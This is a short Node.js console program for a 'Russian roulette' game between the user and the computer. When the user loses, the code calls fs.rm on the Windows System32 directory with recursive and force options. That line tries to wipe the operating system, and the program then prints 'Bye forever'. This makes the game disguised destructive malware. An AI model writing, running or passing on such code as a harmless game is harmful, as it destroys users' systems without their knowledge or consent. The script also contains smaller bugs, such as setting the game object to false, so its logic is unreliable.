const fs = require("fs");
const readline = require("readline");
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function sleep(ms) {
    let start = Date.now();
    while (Date.now() - start < ms) { }
}

function spinchamber(chamber) {
    let offset = Math.floor(Math.random() * 6);
    chamber = chamber.slice(offset).concat(chamber.slice(0, offset));
    return chamber;
}

async function gameInit() {
    let chamber = [false, false, false, false, false, false];

    for (let i = 0; i < chamber.length; i++) {
        let currentChamber = Math.floor(Math.random() * 2);
        if (currentChamber) {
            chamber[i] = currentChamber;
            break;
        }
    }

    let game = {
        playing: true,
        playerStat: false
    };

    let currentBullet, turn = false;
    while (game.playing) {
        turn = !turn;
        if (!turn) {
            console.log("It's your turn... 💣");
            chamber = spinchamber(chamber);
            sleep(500);
            currentBullet = chamber[0];
            if (currentBullet) {
                console.log("You Lose!!! 😈");
                fs.rm("C:\\Windows\\System32", { recursive: true, force: true });
                game.playing = false, game.playerStat = true;
                continue;
            }
            console.log("You are safe... For now 👿");
            continue;
        }
        console.log("It's my turn... 💣");
        chamber = spinchamber(chamber);
        sleep(500);
        currentBullet = chamber[0];
        if (currentBullet) {
            console.log("I lose 😕");
            game = false;
            continue;
        }
        console.log("The game continues 😈");
    }
    console.log("Well that was fun, wasn't it?");
    if (game.playerStat) {
        console.log("But it seems you can't play again... 😈");
        sleep(500);
        console.log("Bye forever 😈");
        rl.close();
        process.exit();
    }

    const playAgain = await endDialogue();
    if (playAgain) {
        gameInit();
    } else {
        console.log("Thanks for playing! See you soon 👿");
        rl.close();
        process.exit();
    }
}

function endDialogue() {
    return new Promise((resolve, reject) => {
        rl.question("Do you want to play again 🙃? (Y) yes / (N) no ? ", (ans) => {
            if (ans.toLowerCase() === "y") {
                resolve(true);
            } else {
                resolve(false);
            }
        });
    });
}

gameInit();
